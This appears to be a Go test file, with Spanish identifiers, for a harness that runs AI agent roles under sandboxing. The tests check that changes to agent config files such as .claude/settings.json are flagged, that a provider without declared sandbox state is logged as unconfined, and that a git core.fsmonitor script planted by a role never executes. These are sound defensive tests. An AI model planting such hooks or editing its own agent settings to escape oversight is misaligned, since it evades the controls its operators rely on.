		{"un archivo de .claude/ en el arbol", func() { cdwEscribir(t, filepath.Join(wt, ".claude", "commands", "x.md"), "x") }, []string{".claude/commands/x.md"}},
		{"un directorio del EnArbol del falso", func() { cdwEscribir(t, filepath.Join(wt, ".falso-cdw", "a.json"), "{}") }, []string{".falso-cdw/a.json"}},
		{"settings.json que deja de ser JSON", func() { cdwEscribir(t, settings, `{"hooks":`) }, []string{settings}},
	} {
		antes := FotoConfigAgentes(wt)
		c.cambia()
		got := CambiosConfigAgentes(antes, FotoConfigAgentes(wt))
		if !(len(got) == 0 && len(c.quiero) == 0) && !reflect.DeepEqual(got, c.quiero) {
			t.Errorf("%s: %s: CambiosConfigAgentes = %q; quiero %q", ca, c.nombre, got, c.quiero)
		}
	}
	if c := CambiosConfigAgentes(ConfigAgentes{"a": "1"}, ConfigAgentes{"a": "1"}); c != nil {
		t.Errorf("%s: sin cambios, CambiosConfigAgentes es nil: %q", ca, c)
	}
	if c := CambiosConfigAgentes(ConfigAgentes{"b": "1", "a": "1"}, ConfigAgentes{"a": "2", "c": "1"}); !reflect.DeepEqual(c, []string{"a", "b", "c"}) {
		t.Errorf("%s: cambiado, desaparecido y aparecido, ordenados: %q", ca, c)
	}
}

// ---------------------------------------------------------------- CA-690

// CA-690: un provider falso que no implementa ConEstado sigue corriendo un
// rol que ejecuta, con nivel ninguno y su motivo.
func TestCA690_UnProviderSinEstadoCorreConNivelNinguno(t *testing.T) {
	const ca = "CA-690"
	root, _ := cdwProyecto(t, cdwSeccion)
	res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+"exit 0\n", Options{Provider: cdwSinEstadoNombre})
	if res.RunID == "" {
		t.Fatalf("%s: el provider sin ConEstado corre: %+v\n%s", ca, res, out)
	}
	want := encierro.Info{Nivel: encierro.NivelNinguno, Falta: []string{encierro.FaltaProcesos, encierro.FaltaEscrituras, encierro.FaltaIPC},
		Motivo: encierro.MotivoSinEstado(cdwSinEstadoNombre)}
	got, _ := cdwClave(t, root, res.EnvelopeID)
	cdwExigeInfo(t, ca, "el sobre con el provider sin estado", got, want)
	if want.Motivo != cdwSinEstadoNombre+" no declara su estado" || !strings.Contains(out, encierro.Linea(want)) || !strings.Contains(out, "sin encierro: "+cdwSinEstadoNombre+" no declara su estado") {
		t.Fatalf("%s: el log lo dice:\n%s", ca, out)
	}
}

// ---------------------------------------------------------------- CA-693

// cdwFsmonitor es un fsmonitor que deja una marca si alguien lo corre.
func cdwFsmonitor(t *testing.T) (script, marca string) {
	t.Helper()
	d := t.TempDir()
	marca = filepath.Join(d, "fsmonitor-corrio")
	script = filepath.Join(d, "fsmonitor.sh")
	if err := os.WriteFile(script, []byte("#!/bin/sh\n: > '"+marca+"'\nexit 1\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return script, marca
}

// CA-693: un core.fsmonitor que el rol deja en la config global no corre
// dentro de hoom: el del writer corta por el material antes de Take (sin git
// status); el del characterizer pasa por Take, verify y check con
// core.fsmonitor=false. Control: un git status cualquiera si lo corre.
func TestCA693_UnFsmonitorDelRolNoCorreDentroDeHoom(t *testing.T) {
	const ca = "CA-693"
	for _, rol := range []string{"writer", "characterizer"} {
		root, wt := cdwProyecto(t, "")
		global := os.Getenv("GIT_CONFIG_GLOBAL")
		cdwEscribir(t, global, "[alias]\n\tst = status\n")
		fs, marca := cdwFsmonitor(t)
		script := "git config --global core.fsmonitor '" + fs + "'\n"
		if rol == "writer" {
			script = ar1Codigo + script
		} else {
			script = "printf 'package app\\n\\n// CA-1 caracterizado\\n' > caracterizado_test.go\n" + script
		}
		res, out := cdwCorrer(t, root, rol, aeaTarea, script+"exit 0\n", Options{})
		if cdwExiste(marca) {
			t.Fatalf("%s: %s: el fsmonitor que dejo el rol no corre dentro de hoom: %+v\n%s", ca, rol, res, out)
		}
		if rol == "writer" {
			if res.Stage != "scope" || !res.Scope.Cuts() || res.Note != NotaMaterialDeGit {
				t.Fatalf("%s: el writer que cambia la config global corta por material-de-git: %+v\n%s", ca, res, out)
			}
			if _, ok := aeaViolacion(res.Scope, RuleMaterialDeGit, global); !ok {
				t.Fatalf("%s: la violacion nombra GIT_CONFIG_GLOBAL (%s): %+v", ca, global, res.Scope.Violations)
			}
		} else if res.VerdictID == "" {
			t.Fatalf("%s: el characterizer (sin la regla del material) pasa por verify: %+v\n%s", ca, res, out)
		}
		// control: el fsmonitor es de verdad
		c := exec.Command("git", "status", "--porcelain")
		c.Dir = wt
		_, _ = c.CombinedOutput()
		if !cdwExiste(marca) {
			t.Fatalf("%s: fixture: un git status sin core.fsmonitor=false corre el fsmonitor", ca)
		}
	}
}

// CA-693: el rol que cambia la config de los agentes y deja un fsmonitor en el
// config comun corta sin correr git status: el fsmonitor no corre.
func TestCA693_LaConfigDeAgentesCortaAntesDeGitStatus(t *testing.T) {
	const ca = "CA-693"
	root, wt := cdwProyecto(t, "")
	fs, marca := cdwFsmonitor(t)
	script := "git config core.fsmonitor '" + fs + "'\nmkdir -p .claude\nprintf '{}' > .claude/settings.json\nexit 0\n"
	res, out := cdwCorrer(t, root, "characterizer", aeaTarea, script, Options{})
	if res.Stage != "scope" || res.Note != NotaConfigDeAgentes("characterizer") {
		t.Fatalf("%s: corta por config-de-agentes: %+v\n%s", ca, res, out)
	}
	if cdwExiste(marca) {
		t.Fatalf("%s: cortar por config-de-agentes no corre git status (el fsmonitor corrio)", ca)
	}
	_ = wt
}

// ---------------------------------------------------------------- utilidades

var _ = io.Discard
var _ = taskcmd.Start
var _ = runcmd.TaskDir
